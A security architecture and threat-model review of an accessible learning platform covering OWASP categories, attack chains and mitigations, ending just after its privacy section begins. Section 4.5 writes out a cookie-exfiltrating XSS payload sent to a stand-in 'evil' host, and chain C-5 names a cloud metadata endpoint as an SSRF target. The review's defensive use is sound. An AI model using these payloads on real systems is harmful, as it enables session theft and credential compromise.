# Security Architecture Review — Track 2 Accessible Learning Media Platform

**Reviewed artifact:** `docs/security_architecture_plan.md` (Consolidated Architecture & Security Plan v2.0)
**Review type:** Defensive architecture & threat-model review — OWASP Top 10 attack-vector analysis, privacy deep-dive, accessibility-security tension assessment
**Scope:** Track 2B content publishing pipeline, reference lesson player (Web Component embedded in Savanna), Savanna adapter, offline reader & downloadable packs, career gateway & certificate verifier
**Standing constraint applied to every mitigation in this review:** no control may introduce cognitive-function tests, timing pressure, split OTP inputs, or visual puzzles, and all error/rate-limit UX must remain operable with NVDA, TalkBack, refreshable Braille displays, 200% zoom, voice control, and EthSL-based workflows.

---

## 1. Executive Summary

The plan is **architecturally sound and unusually accessibility-literate**. Passkey-first staff authentication, the absolute CAPTCHA ban paired with server-side rate limiting, fail-closed delegated sessions, the draft/published storage split, the human-in-the-loop AI gate, the zero-diagnosis privacy posture, and zero-PII offline packs are all correct decisions that are rarely specified this early in a project. The zero-assumption policy (Section 7) is the right instinct.

However, this review identified **15 findings (4 High, 5 Medium-High, 6 Medium/Low)** that the plan does not yet cover. The most important structural fact the plan underweights:

> **The `Accessible lesson Web Component` runs directly in the Savanna host page DOM (Shadow DOM, not an iframe). Any stored XSS that survives sanitization in caption text, transcripts, image descriptions, or chat replay executes with Savanna's full origin privileges — the learner's Savanna session cookie, Rails CSRF tokens, and the "Mark as complete" endpoint are all in reach.** This makes content sanitization a *host-origin* security control, not merely a component-internal one.

**Top risks at a glance:**

| # | Risk | Severity | Section |
| :-- | :--- | :--- | :--- |
| R-01 | Stored XSS in player content executes at Savanna origin (no iframe isolation) | High | §4.5, §5.1 |
| R-02 | Pre-signed asset URL leakage via Referer, sharing, and caching | High | §4.1, §5.3 |
| R-03 | Indefinite session extension via synthetic activity + silent refresh | High | §4.7, §5.2 |
| R-04 | IDOR on export-job polling (`GET /v1/export-jobs/{id}`) leaks unapproved drafts | High | §4.1, §5.4 |
| R-05 | SSRF via DAISY/PDF/AI workers (XXE in XML pipelines, image fetches, vendor URLs) | Med-High | §4.10, §5.5 |
| R-06 | Per-IP rate limits break under Ethiopian CGNAT → mass false lockouts | Med-High | §4.7, §7.2 |
| R-07 | Progress-event replay = completion fraud, undermining verifier credibility | Med | §4.6, §5.6 |
| R-08 | Offline pack tampering (SHA-256 gives integrity, not authenticity) | Med | §4.8, §5.7 |
| R-09 | Privacy inference from format-preference telemetry & User-Agent logging | Med | §6 |
| R-10 | `SameSite=Strict` staff cookie conflicts with SSO/OIDC return flows | Med | §4.7 |
| R-11 | Launch-token forwarding on protected Independent-website lessons | Low-Med | §4.7 |
| R-12 | OpenAPI/docs exposure and `env_development` artifacts in production | Low-Med | §4.2 |
| R-13 | Magic-link replay, host-header poisoning of emailed links | Low-Med | §4.7 |
| R-14 | Vulnerable conversion components (Liblouis, ffmpeg, DAISY, bleach) | Low-Med | §4.3 |
| R-15 | Certificate-verifier ID enumeration (needs uniform responses) | Low | §4.1 |

**Verdict:** Proceed with the plan. Add the controls in §8 (prioritized register) and §9 (concrete configuration) before production lock-in. None of the additions conflict with the accessibility pillars.

---

## 2. Method

1. **Decision-by-decision review** of every architectural choice in Sections 1–5 of the plan (§3 below).
2. **OWASP Top 10 (2025) walkthrough**, cross-mapped to the 2021 category names, with attack vectors derived from *this system's* actual data flows — not generic checklists (§4).
3. **Ranked attack chains** combining primitives into realistic end-to-end compromises (§5).
4. **Privacy deep-dive** focused on the platform's unique hazard: assistive-usage telemetry that can silently reveal disability status (§6).
5. **Accessibility-security tension matrix** ensuring every added control is operable with assistive technology (§7).
6. **Findings register + concrete controls + answers to the plan's seven open questions + gate-checklist additions** (§8–§11).

**OWASP Top 10 category mapping used in this review:**

| 2025 category (primary) | 2021 name | Review § |
| :--- | :--- | :--- |
| A01 Broken Access Control | A01 Broken Access Control | §4.1 |
| A02 Security Misconfiguration | A05 Security Misconfiguration | §4.2 |
| A03 Software Supply Chain Failures | A06 Vulnerable and Outdated Components | §4.3 |
| A04 Cryptographic Failures | A02 Cryptographic Failures | §4.4 |
| A05 Injection | A03 Injection | §4.5 |
| A06 Insecure Design | A04 Insecure Design | §4.6 |
| A07 Authentication Failures | A07 Identification and Authentication Failures | §4.7 |
| A08 Software or Data Integrity Failures | A08 Software and Data Integrity Failures | §4.8 |
| A09 Logging & Alerting Failures | A09 Security Logging and Monitoring Failures | §4.9 |
| A10 Mishandling of Exceptional Conditions | (new in 2025; SSRF moved out of the list) | §4.10 |

> **Note on SSRF:** SSRF dropped out of the 2025 Top 10, but this architecture has genuine SSRF surface (external AI vendors, XML-based DAISY conversion, HTML-to-PDF image resolution), so it is analyzed explicitly in §4.10 and chain C-5.

---

## 3. Architectural Decision Review

Each decision from the plan is assessed: what it gets right, the residual risk it carries, and the action required.

| # | Decision | Strength | Residual risk | Required action |
| :-- | :--- | :--- | :--- | :--- |
| D-01 | Zero-prompt delegated auth via Savanna session cookie (adapter-verified) | Removes a second login barrier; correct trust direction | Adapter becomes a high-value minting point; CSRF on token-mint endpoint; unclear contract (open Q1) | Add Origin/`Sec-Fetch-Site` validation + CSRF token on all adapter state-changing routes (§9.5) |
| D-02 | Reject client-side DOM hints (`body.signed_in`, `data-react-props`) | Correctly identifies the starter-audit finding as spoofable | None — but must also reject *client-supplied enrollment context* in progress events | Extend the rule to all client-supplied identity claims (§4.1) |
| D-03 | Fail-closed accessible sign-in callout | Prevents partial-content leaks; good WCAG posture | Return-URL on the login link is an open-redirect sink if unvalidated | Allowlist the `Resume` return URL to Savanna origins only (§9.5) |
| D-04 | Never touch host Rails CSRF token / never auto-"Mark as complete" | Correct scope discipline | Does not address the *reverse* direction: XSS in our content could press the host's buttons | Host-origin XSS defense-in-depth (§5.1, §9.1) |
| D-05 | Passkey-first (WebAuthn) staff auth + SSO | Phishing-resistant; zero transcription; ideal for this team | Recovery for lost authenticators is unspecified; `SameSite=Strict` breaks OIDC return (R-10) | Admin-assisted recovery (no security questions — NIST 800-63B); cookie-strategy fix (§9.4) |
| D-06 | Passphrase fallback: length-first, breached-list screening, paste enabled, autocomplete | WCAG- and NIST-aligned | None material | Keep; add breach-list caching policy (privacy of query logs) |
| D-07 | Single-input OTP, 10-min validity | Fixes WCAG F109 | 10 min is generous; brute-force surface if rate limit is permissive | 5–10 min OK **with** per-code attempt cap (≤5) + per-user throttle (§9.4) |
| D-08 | Zero CAPTCHAs anywhere; rate limiting + RBAC instead | Legally/ethically correct for this user base; WCAG 3.3.8/3.3.9 | Per-IP limits will false-positive under CGNAT (R-06); stuffing shifts to Savanna itself | Per-user primary limits, high per-IP ceilings, no permanent lockouts (§9.3) |
| D-09 | Activity-aware silent token refresh (playback, focus traversal, etc.) | Genuinely assistive-aware; prevents mid-lesson lockouts | Synthetic activity keeps stolen sessions alive indefinitely (R-03) | Server-side refresh arbitration + absolute session cap + rotation/reuse detection (§9.4) |
| D-10 | Progress-event queue & replay after re-auth | Prevents data loss on 400 kbps links; SC 2.2.5 | Client-controlled replay = completion fraud primitive (R-07) | Validate replay plausibility server-side; decide progress authority (§4.6) |
| D-11 | Staff `HttpOnly/Secure/SameSite=Strict` cookie + 15 s autosave | Correct token-storage choice | Strict breaks IdP redirect returns; autosave writes are a CSRF-relevant mutating surface | Lax cookie for IdP callback handoff or POST-message continuation; CSRF on autosave (§9.4) |
| D-12 | Async job pattern (`job_id` + polling, ARIA polite completion) | Correct for long Braille/PDF jobs; avoids SR flooding | `job_id` scoping unspecified → IDOR (R-04) | UUIDv4 IDs + ownership check + uniform 404 (§9.2) |
| D-13 | Zero-auth offline ZIP packs | Removes login barrier; zero-PII sharing story is strong | Tampered-pack integrity story (R-08); pack enumeration | Ed25519-signed manifests verified by the PWA (§9.6); keep pack listing unlisted + rate-limited |
| D-14 | Draft/Published storage split + atomic publish + SHA-256 | Strong design | Prefix isolation is one config bug from failing; pre-signed URL hygiene unspecified (R-02) | Bucket-level public-access block; short TTLs; `Referrer-Policy`; `Cache-Control: private, no-store` (§9.2) |
| D-15 | Course-version binding on every query | Prevents version-mismatch (functional + privacy win) | None | Keep; add test for old-version requests post-revision |
| D-16 | Zero-PII operational logging (correlation IDs, roles only) | Excellent minimization | Conflicts with incident investigation; correlation re-linking path undefined | Pseudonym-mapping table, access-controlled, short TTL (§9.7) |
| D-17 | Zero-diagnosis policy; functional format prefs only | Core privacy control of the whole platform | Prefs still form a quasi-identifier if centralized (R-09) | Keep prefs client-side where feasible; scrub UAs from logs; k-anonymity for any aggregate analytics (§6) |
| D-18 | DOMPurify + server-side sanitizer | Right dual-layer instinct | `bleach` is unmaintained (R-14); sanitizer must be authoritative *before* storage, not only on render | Replace bleach with `nh3`/ammonia-class allowlist; sanitize at ingest (§9.1) |
| D-19 | AI vendor payload minimization + `systemPrompt` hardening | Correct posture vs. prompt injection & SSRF | Vendor retention/DPA unresolved (open Q4); audio is biometric-adjacent | Prefer self-hosted Whisper; if vendor: DPA + zero-retention + no training clause (§10, Q4) |
| D-20 | Network-isolated conversion subprocesses scoped to job paths | Strong containment | Container hardening unspecified (root, caps, seccomp) | read-only FS, `no-new-privileges`, dropped caps, seccomp, non-root (§9.6) |
| D-21 | SRI on embed script | Correct for third-party hosting | Missing companion headers: `Referrer-Policy`, `X-Content-Type-Options` | Add header set (§9.1) |
| D-22 | Namespaced multi-instance `localStorage` | Prevents embed collisions | None | Keep |
| D-23 | Public, CAPTCHA-free certificate verifier | Employer-friendly; accessible | Enumeration surface; `unknown` vs `revoked` response shapes | Uniform response shapes + rate limit + `noindex` (§9.2) |
| D-24 | DEMO verifier isolation from real credentials | Prevents synthetic/real credential conflation | Demo data in production DB is a future leak path | Physically separate demo store or schema + startup guard (§9.8) |

---

## 4. OWASP Top 10 (2025) — Attack Vectors, Gaps, Mitigations

### 4.1 A01 — Broken Access Control

**Why this is the top category here:** the platform's value is *content correctness per course version*, and its storage model is capability-token-based (pre-signed URLs) + a multi-role pipeline (Author/Reviewer/Publisher) + an embedded client that receives identity from a host. Three distinct broken-access-control surfaces exist.

**Probable attack vectors (system-specific):**

1. **Pre-signed URL as bearer capability (R-02).** `Authorized asset URLs` are self-contained. Any learner who copies a URL from their browser (or whose browser leaks it via `Referer` on an embedded page, or whose CDN cached the response) grants anyone with the link access until expiry. On a third-party host page (Independent website), `Referer` leakage of asset URLs is the default behavior unless suppressed.
2. **Draft-prefix confusion (C-3 chain).** A single bug in path construction (`/published/{version_id}` vs `/draft/{version_id}`) or an over-broad bucket policy silently converts the draft/published split into one namespace. The plan's "physically or prefix-isolated" phrasing leaves this open — *prefix* isolation is weaker than physical separation.
3. **Export-job IDOR (R-04).** `GET /v1/export-jobs/{id}` returns job status; if job payloads or status responses include asset paths, draft captions, or Braille output, guessing or observing sequential IDs exposes **unapproved content** — including interpreter recordings and co-designer material that consented to *internal review only*.
4. **Enrollment revocation lag.** Silent refresh (D-09) can extend a learner's access after they are unenrolled, unless every refresh re-validates enrollment. Attack: a learner who loses access (e.g., refund, disciplinary action) retains a working token for up to the full refresh horizon.
5. **Ownership checks on progress events.** If the adapter accepts client-supplied `lesson_id`/`user_id` pairs in queued replay (D-10), learner A can post learner B's completion.
6. **Certificate-verifier enumeration (R-15).** Differing responses/timings for `valid` vs `revoked` vs `unknown` IDs let an attacker enumerate issued certificates — real learners' course names become harvestable.

**Plan status:** RBAC + ownership checks and course-version binding are specified. URL hygiene, revocation propagation, and job-ID scoping are **not**.

**Mitigations (accessibility-preserving):**
- Pre-signed URL TTL ≤ 300 s for streaming, ≤ 60 s for refresh; responses served with `Cache-Control: private, no-store` and `Referrer-Policy: no-referrer` on asset hops. Never issue list operations to non-staff.
- Prefer **physical bucket separation** (two buckets) over prefixes; add a CI test asserting learner-role tokens get 404 on every draft path.
- Export jobs: UUIDv4 IDs, server-enforced `(job.owner_role, owner_id)` check, uniform 404 for foreign jobs (no 403 — avoids confirming existence).
- Silent refresh re-validates enrollment + course-version entitlement **every time**; revocation propagates within one token TTL (≤ 1 h).
- Verifier: identical response *shape and timing* for unknown/revoked; rate-limit per IP and per credential-ID; `X-Robots-Tag: noindex`.
- Accessibility note: all 403/404 bodies must use the plain-language bilingual error schema already planned ("You don't have access to this lesson — ask your teacher"), never raw status words. Uniform messages also avoid revealing which resources exist.

### 4.2 A02 — Security Misconfiguration

**Probable attack vectors:**
- **CORS on `/api/v1` (R-10 adjacent).** The plan allows "explicit Savanna-origin CORS (`credentials: true`, no wildcard)" but the Independent website is a *different* origin. A common failure mode: widening to `*.alxafrica.com` or reflecting `Origin` verbatim to support embeds → credentialed cross-origin reads from any sibling subdomain (a sibling-subdomain takeover then becomes an origin bypass).
- **OpenAPI leakage.** FastAPI's `/docs`, `/redoc`, `/openapi.json` enumerate every route, parameter, and role gate — a free recon map (R-12).
- **`env_development` artifacts.** The starter audit already showed `<body class="signed_in env_development">` on the host; if any of our own surfaces ships debug flags (`DEBUG`, verbose Pydantic errors, uvicorn access logs with URLs containing launch tokens), tokens land in logs.
- **Storage misconfig.** Public-read on the Published bucket "for simplicity", versioning disabled (no rollback after tampering), no server-side encryption default.
- **Container defaults.** Workers running as root, Docker socket mounted, no resource limits → a converter exploit (R-14) becomes host escape.

**Mitigations:**
- Hard-coded allowlist of exact origins (scheme + host), never reflection, never wildcard subdomains; the Independent website uses the **launch-token** flow, not cookies, so it does not need credentialed CORS at all.
- Gate `/docs` behind an admin role or disable in non-dev environments; keep `/openapi.json` if needed for the adapter, but authenticate it.
- Add the header baseline in §9.1 (HSTS, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`) to *our* origins; request the same baseline from ALX for host pages carrying the component.
- Bucket policy: public access blocked at account level; SSE enabled; versioning on; deny-by-default.
- Worker containers: non-root, `no-new-privileges`, dropped capabilities, seccomp default, read-only rootfs, memory/CPU caps.

### 4.3 A03 — Software Supply Chain Failures

**Probable attack vectors:**
- **Liblouis (C) parsing attacker-influenced text/tables** — history of memory-corruption CVEs; it processes lesson text on every Braille export. A crafted caption or lesson body is enough.
- **ffmpeg / media transcoders** — a master video is semi-trusted (ALX-sourced), but the resumable-upload path (D-01 table, node 1) accepts arbitrary author files; malicious media = parser exploitation.
- **`bleach` is unmaintained** (R-14): the plan names it as the server-side sanitizer; an abandoned sanitizer is a slow-motion vulnerability.
- **DAISY Pipeline (Java + XML)** — XML processing is an XXE/SSRF gateway (§4.10).
- **Embed script supply chain (Independent website).** The component JS is the payload third parties trust; a compromised build/CDN distributes XSS to every host page at once. SRI helps hosts pin a known-good hash but nothing pins *our* build.
- **Whisper/PyTorch model or pickle artifacts** if self-hosted — model files are code.

**Mitigations:**
- Replace `bleach` with `nh3` (Rust ammonia bindings) or an equivalent maintained allowlist sanitizer; sanitize **at ingest** (authoritative) and treat client-side DOMPurify as defense-in-depth only.
- Generate an SBOM (CycloneDX) per release; Dependabot/Renovate; pip hash-pinning; container scans (Trivy) in CI; pin base images **by digest**.
- Publish the embed with release channels + `latest`-free URLs (hosts pin major versions), so a bad deploy can't silently replace every embed.
- Self-hosted models: verify model artifact checksums from the upstream release; never load pickle files from untrusted sources.

### 4.4 A04 — Cryptographic Failures

**Probable attack vectors:**
- **Launch tokens** (Independent website protected lessons): if signed with a weak/short HMAC secret, no `aud`/`exp`/`jti`, or accepted without signature verification → token forgery = free access to protected lessons.
- **Offline-pack "integrity" is not authenticity (R-08):** SHA-256 in `manifest.json` detects *corruption*, but an attacker who can modify the pack (shared storage, Bluetooth, MitM on a non-HTTPS download) regenerates the manifest too. A tampered pack with malicious HTML then runs inside the Offline Reader PWA origin (or `file://`) — same problem as R-01 but self-hosted.
- **Pre-signed URL signing key** (if self-hosting MinIO/S3-compatible): weak root credentials, or signing keys logged.
- **No encryption-at-rest statement** for PostgreSQL or object storage; consent records and caption drafts (which can contain names) sit in cleartext at rest.

**Mitigations:**
- Launch tokens: EdDSA (Ed25519) or HS256 with a ≥ 256-bit rotated secret; claims `aud` (host origin), `exp` (≤ 15 min), `jti` (replay cache), `lesson_id`, `course_version_id`; verify `aud` on every request.
- **Sign offline packs:** Ed25519 signature over the canonical manifest, public key pinned in the PWA; verify before rendering pack HTML; on failure, show an accessible error + one-click re-download (see §7 for the UX). This converts SHA-256 integrity into authenticity at zero user cost.
- TLS 1.2+ only (prefer 1.3), HSTS preload on our origins; SSE (AES-256) on both buckets; PostgreSQL disk encryption or encrypted volumes; DB secrets from the secret manager, never env files in images.

### 4.5 A05 — Injection

**Why this category is unusually severe here (R-01):** the Web Component renders untrusted editorial content — caption cue text, transcripts, image descriptions, chat replay — **inside the Savanna host page**. There is no iframe boundary: the "attacker-controlled content sandbox" and the "victim's authenticated page" share an origin.

**Probable attack vectors:**
1. **Stored XSS via caption/transcript text.** WebVTT cue text is commonly rendered as HTML-ish content in custom players. A cue containing `<img src=x onerror=fetch('//evil?c='+document.cookie)>` executes with Savanna cookies if any render path uses `innerHTML`. Shadow DOM does **not** sanitize — it only scopes styles.
2. **WebVTT structural injection.** Cue timestamps/identifiers with injected payloads (`NOTE`, malformed blocks) that break downstream parsers or export generators.
3. **Chat-log replay injection.** Learner chat is the least-trusted text in the pipeline; it is explicitly planned for redaction and later rendering — the highest-risk untrusted source.
4. **`javascript:` / `data:` URIs** in links inside descriptions or lesson HTML exports (the offline HTML pack is a render target).
5. **Path traversal via filenames** into Liblouis/DAISY command lines or export paths — even with UUID renaming, any code path that echoes the original name is suspect.
6. **SQL injection via dynamic filters** (sort/order/search params in lesson listing) if query building is string-composed.
7. **Queue-payload injection:** a crafted job payload (if jobs accept client hints) whose fields are later interpolated into worker commands.

**Mitigations (layered, accessibility-first):**
- **Render as text, never as markup:** the player must set `textContent` for cues, transcripts, and descriptions; no `innerHTML`, no `insertAdjacentHTML`, no `dangerouslySetInnerHTML` anywhere in the component. This single rule removes the primary XSS sink while remaining fully screen-reader friendly (text nodes are announced identically or better).
- Sanitize at ingest with an allowlist (no `script`, no event handlers, no `javascript:`/`data:` URIs) — server-side is authoritative; DOMPurify is a second layer.
- For any future rich-text need, prefer a micro-iframe (`sandbox="allow-same-origin"` without scripts, `title` set for screen readers) over Shadow-DOM HTML injection — but only if text-node rendering is genuinely insufficient.
- WebVTT validation: strict block grammar, UTF-8, normalized (NFC) before sanitize so encoding tricks can't bypass filters; reject oversized cues.
- Filenames: strip to `[A-Za-z0-9._-]`, UUID-stored, original name kept only in DB metadata and re-escaped at display.
- SQLAlchemy parameter binding everywhere; forbid string-composed `ORDER BY`/`LIKE` (map sort keys to allowlisted columns).
- Push Savanna (open Q1/Q2 conversation) for a CSP with no `unsafe-inline` and Trusted Types on host pages — this is the last-line backstop for host-origin XSS (§9.1).
- **Accessibility note:** text-node rendering and `role="region"` announcements are *more* reliable for screen readers than innerHTML-based rich rendering; this mitigation improves AT consistency rather than degrading it.

### 4.6 A06 — Insecure Design

**Probable attack vectors / design tensions:**
1. **Progress authority (R-07).** Queued replay means the client is a trusted source of completion truth. If certificates or gateway job-matching read progress, a tampered client (or a patched offline pack) can self-award completion. The plan forbids offline packs from self-awarding, but the online replay path is still client-authoritative.
2. **Trust re-association at refresh.** Silent refresh (D-09) re-issues access on activity signals; combined with client-observable signals (focus traversal), a malicious host page could keep a *lapsed-enrollment* learner's token alive.
3. **Separation of duties.** The plan has five roles but does not state that **Author ≠ Reviewer ≠ Publisher for the same lesson revision**. Without that constraint, one compromised staff account can push unreviewed content — including attacker-crafted captions — straight to learners (this is the poisoning end-state of R-01).
4. **Session replay of queued progress across accounts** (progress queue keyed only by lesson, not by learner session) could let one account donate completion to another.

**Mitigations:**
- Server-side plausibility checks on replay: monotonic timestamps, max playback-rate deltas, completion requires server-observed asset fetches (the pre-signed URL issuance is already server-side — use it as implicit attestation).
- Enforce two-person integrity per revision: transition rules `author_id ≠ reviewer_id ≠ publisher_id` per `course_version_id`, enforced in the state machine, with audit entries (§9.7).
- Refresh arbitration: only the **adapter** (server component) may call refresh, driven by its own recent activity observations (API calls it served), never by client-emitted "I'm active" messages.
- Absolute session ceiling (e.g., 12 h) regardless of activity.

### 4.7 A07 — Authentication Failures

**Probable attack vectors:**
- **CSRF on the adapter's token-mint endpoint:** a cross-site POST from an attacker page, while the victim's Savanna cookie rides along, obtains a valid launch token for the victim's context (`credentials: include` + permissive CORS = theft). `SameSite=Lax` blocks cross-site POSTs in modern browsers but not legacy/edge cases and not same-site subdomain attackers.
- **Session fixation in the delegation flow:** if the adapter reuses a minted token across launches or binds it to attacker-known context, tokens can be pre-planted.
- **OTP (10-min window, D-07):** without an attempt cap, 10 minutes at server speed is enough to brute 6-digit space (10⁶) many times over.
- **Magic-link fallback (R-13):** single-use enforcement, expiry, and *host-header poisoning* of the emailed link (link built from `Host` header → points at attacker domain). Email links in Amharic + English also need spoofing-resistant sender alignment (SPF/DKIM/DMARC on the sending domain).
- **No lockouts (by design, D-08):** correct for accessibility, but requires throttling rather than lockout to avoid stuffing windfalls.
- **Logout that doesn't revoke:** if logout only clears the client cookie while the bearer token lives its full TTL, a stolen token survives logout — check every logout path (staff console, adapter, offline PWA).

**Mitigations:**
- Mint endpoint: require `Origin`/`Sec-Fetch-Site` allowlist + a per-session CSRF token; issue one token per launch with `jti`; short TTL (≤ 15 min) with silent exchange for shorter asset-scoped tokens.
- OTP: ≤ 5 attempts per code, then force reissue; per-user + per-IP throttle with `Retry-After` (§9.3); consider moving staff MFA to passkey-only to delete this surface entirely.
- Magic links: single-use, 10-min expiry, absolute allowlisted link base (no `Host`-derived URLs), invalidation on password change/email change; DMARC-enforced sending domain.
- All logout/password-change/email-change events revoke server sessions and refresh-token families; refresh-token rotation with reuse detection (reuse → revoke family).
- **Accessibility note:** throttling (progressive delay) instead of lockout preserves SC 2.2.1 and avoids punishing AT users whose navigation patterns look "bot-like" (rapid sequential focus changes). Add a plain-language bilingual explanation when throttled.

### 4.8 A08 — Software or Data Integrity Failures

**Probable attack vectors:**
- Unsigned offline packs and service-worker caches (covered in §4.4 / R-08).
- **Deserialization in the job queue:** if jobs use Python `pickle`/`dill` or trust worker messages, a queue compromise = RCE on workers.
- **AI-drafted content provenance:** AI transcription/translation output enters the same pipeline as human text; without marking origin, a poisoned draft could masquerade as reviewed content if review-state bookkeeping has a gap.
- **Build/deploy integrity:** the embed script and PWA bundles are the trust root for every third-party host; unsigned releases allow a compromised pipeline to push malicious code everywhere at once.

**Mitigations:**
- JSON + Pydantic-validated job payloads only; no pickle anywhere; queue messages signed at the application layer if the broker is shared.
- Provenance column on every content segment (`source: ai_draft | human | human_corrected_ai`) surfaced in the review UI so reviewers always see what they are approving; AI output **cannot** skip `in_review` (already planned — enforce with a DB constraint, not just code).
- Signed release artifacts; the PWA checks its own bundle hash on update; service worker updates fetched only over HTTPS with hash pinning, falling back to the last valid cache (already planned — extend the same rule to pack HTML rendering).

### 4.9 A09 — Logging & Alerting Failures

The plan's zero-PII logging is right, but as written it **under-logs security events** and leaves an investigation gap.

**Probable attack vectors (detection-shaped):**
- Draft-prefix access attempts by learner tokens (should be zero) — if unlogged, the C-3 chain runs silently.
- Export-job IDOR sweeps (many distinct `job_id` GETs) — indistinguishable from normal polling without alerting.
- Mass pack downloads (library scraping) — indistinguishable from normal low-bandwidth learners without rate telemetry.
- Verifier enumeration — needs per-ID rate telemetry.
- Progress-replay anomalies (implausible completions) — currently silent by design.

**Mitigations:**
- Security event log (separate stream): authz denials, draft-path 404s from learner roles, token-mint failures, refresh reuse, OTP attempt-cap trips, rate-limit hits by class, publish/consent state transitions. Contents: correlation ID, timestamp, role, route, decision reason. No PII.
- **Pseudonym bridge:** a separate, access-controlled table mapping `correlation_id → internal user id` with 30-day TTL exists *solely* for incident response; its access is itself audit-logged. This preserves the zero-PII property of operational logs while keeping incidents investigable (GDPR Art. 5(1)(b) compatible).
- Alerts: draft-path access attempt (immediate), IDOR sweep pattern (> N distinct job IDs / min), refresh-reuse (immediate — indicates theft), verifier enumeration, publish without quorum.
- Consent/state transitions append-only with hash chaining (tamper-evident audit trail).

### 4.10 A10 — Mishandling of Exceptional Conditions (incl. SSRF)

**Probable attack vectors:**
1. **XXE→SSRF via DAISY/DOCX/EPUB XML processing:** XML parsers resolving external entities fetch attacker-chosen URLs (cloud metadata at `169.254.169.254`, internal services) from inside the worker network.
2. **HTML→PDF image resolution:** tagged-PDF generation fetching `<img src>` from lesson HTML — an SSRF sink if source HTML can carry internal-looking URLs.
3. **AI vendor endpoint flexibility:** if the worker reads `apiUrl`-style fields (the `::chidi data:` pattern the plan already flags) or takes vendor base URLs from config-by-payload, job payloads can redirect exfiltration.
4. **Fail-open on job errors:** a worker crash leaving jobs `processing` forever, retry storms, or partially-written draft assets becoming readable via the published path after a partial publish.
5. **Error responses leaking internals:** stack traces, SQL fragments, bucket names in errors (the plan covers client-facing errors — worker logs and admin endpoints need the same discipline).

**Mitigations:**
- All XML parsers: external entities disabled (`resolve_entities=false`, `no_network=true`, DTDs off) — verify for every XML touchpoint (DAISY, DOCX import, EPUB).
- Egress proxy for workers: allowlist = chosen AI vendor + OS package mirror only; **deny** RFC 1918/CGNAT/link-local/metadata ranges at the proxy and at the container network level; IMDSv2 (hop limit 1) on any cloud deploy.
- `systemPrompt`/URL fields: hard-reject any URL in payload fields (allowlist to empty set — the plan says "strip untrusted URLs"; make the rule *reject*, not strip, so tampering is visible).
- Job lifecycle: idempotent handlers, max-retry with dead-letter queue, partial-publish protection (publish copies all assets first, flips the pointer only after full verification — the plan's atomic publish; add a verification step that Published content passes hash checks before the pointer flip).
- Uniform error schema everywhere including admin/worker endpoints; exceptions logged server-side with correlation ID only.

---

## 5. Ranked Attack Chains

The highest-value compromises combine primitives from §4 into realistic end-to-end paths.

### C-1 — Caption XSS → Savanna-origin takeover (R-01) — **Critical if sanitizer gaps exist**
1. Attacker (or compromised Author account) submits a caption cue containing an event-handler payload during drafting (staff console accepts it if the ingest sanitizer misses one vector, e.g., mXSS or a raw WebVTT passthrough).
2. Content passes review (reviewer reads text, not rendered markup) and publishes.
3. A learner opens the lesson on Savanna; the Web Component renders cues via an `innerHTML` path → payload executes **with Savanna's origin**.
4. Payload exfiltrates the learner's Savanna session cookie (`HttpOnly` blocks direct read — but CSRF on "Mark as complete" and host APIs does not), performs CSRF actions, or harvests DOM data (`data-react-props` contains learner context).
**Breaks the chain at:** text-node-only rendering (§4.5), authoritative ingest sanitization, Savanna CSP/Trusted Types (§9.1), and two-person integrity per revision (§4.6).

### C-2 — Export-job IDOR → pre-publication content leak (R-04) — **High**
1. Attacker with a **Learner** role (or no role, via the Independent website launch token) polls `GET /v1/export-jobs/{id}` with guessed IDs.
2. If job responses embed asset paths or draft content, the attacker retrieves interpreter sign-language recordings or co-designer material that consented to *internal review only* — a privacy breach of the exact population the platform exists to protect.
**Breaks the chain at:** UUIDv4 job IDs, `(owner_role, owner_id)` check, uniform 404, and job responses that carry no content (only status + correlation ID).

### C-3 — Draft-prefix confusion → mass draft exfil (D-14) — **High if prefix-isolated**
1. A path-construction bug (or bucket policy drift) exposes the `draft` prefix under the `published` route.
2. The embed's manifest fetch (unauthenticated demo lessons) is enumerated → **all** unapproved assets, including rejected/failed review content, are downloadable.
**Breaks the chain at:** physical bucket separation, account-level public-access block, learner-token 404 CI test on all draft paths, and draft-path access alerting (§4.9).

### C-4 — Stolen session + synthetic activity → indefinite access (R-03) — **High**
1. Attacker obtains a learner's bearer token (XSS from C-1, a shared device, or a patched client).
2. Attacker's client emits synthetic activity events (playback events, focus events) → adapter's silent refresh keeps the token alive **forever**.
3. Learner logs out on their device; the stolen token survives because logout didn't revoke the refresh family.
**Breaks the chain at:** refresh arbitration in the adapter only (server-observed activity), absolute 12 h session cap, refresh-token rotation + reuse detection, and server-side revocation on logout/password change.

### C-5 — Job SSRF → cloud metadata → draft bucket takeover (R-05) — **High (cloud deploys)**
1. Attacker injects a crafted XML entity or PDF image URL into a lesson document during upload.
2. The DAISY/PDF worker resolves it → fetches `169.254.169.254/latest/api/token` (or internal service endpoints).
3. Retrieved credentials/roles → object-storage access → **draft bucket** (unapproved content + consented-to-internal-only interpreter recordings).
**Breaks the chain at:** XML entity resolution disabled, egress allowlist proxy + metadata-range deny, IMDSv2, per-job scoped storage credentials (already planned), and non-root sandboxed workers.

### C-6 — Progress replay → completion fraud → verifier credibility collapse (R-07) — **Medium**
1. A patched client (or scripted browser) submits implausible progress replay: full completion without asset fetches.
2. Savanna/gateway marks the course complete; certificate is issued.
3. Employers verify the credential (public verifier) — the platform's trust story collapses once one forged credential is demonstrated.
**Breaks the chain at:** plausibility validation (server-observed asset fetches required for completion), two-person integrity, and the decision to treat progress as *advisory* until server-attested (§4.6).

### C-7 — Tampered offline pack → PWA-origin XSS (R-08) — **Medium**
1. Learner downloads a pack; an intermediary (shared PC, MitM on non-HTTPS host, compromised download link) swaps HTML in the ZIP and regenerates the SHA-256 manifest.
2. The Offline Reader PWA renders the pack HTML from its own origin → stored XSS in the PWA (access to service-worker caches, other cached packs, potentially sync tokens).
**Breaks the chain at:** Ed25519-signed manifests verified against a PWA-pinned public key before rendering (§9.6); HTTPS-only pack hosting; serving pack HTML from a sandboxed context.

### C-8 — CGNAT lockout DoS (R-06) — **Medium (availability + accessibility)**
1. An Ethiopian mobile carrier CGNATs thousands of learners behind a handful of IPs (standard for the target population).
2. Either an attacker on a shared IP exhausts per-IP buckets, or ordinary classroom usage does — every learner behind that IP receives 429s.
3. Screen-reader and low-vision users hit incomprehensible error loops; the "accessible platform" becomes an inaccessible one.
**Breaks the chain at:** per-user (not per-IP) primary limits, 10× per-IP ceilings, progressive throttling not lockout, bilingual plain-language 429 UX with `Retry-After` (§9.3).

---

## 6. Privacy Deep-Dive — Disability Inference & Sensitive-Data Paths

The plan's zero-diagnosis policy is the correct foundation. This section addresses what can still leak, and how.

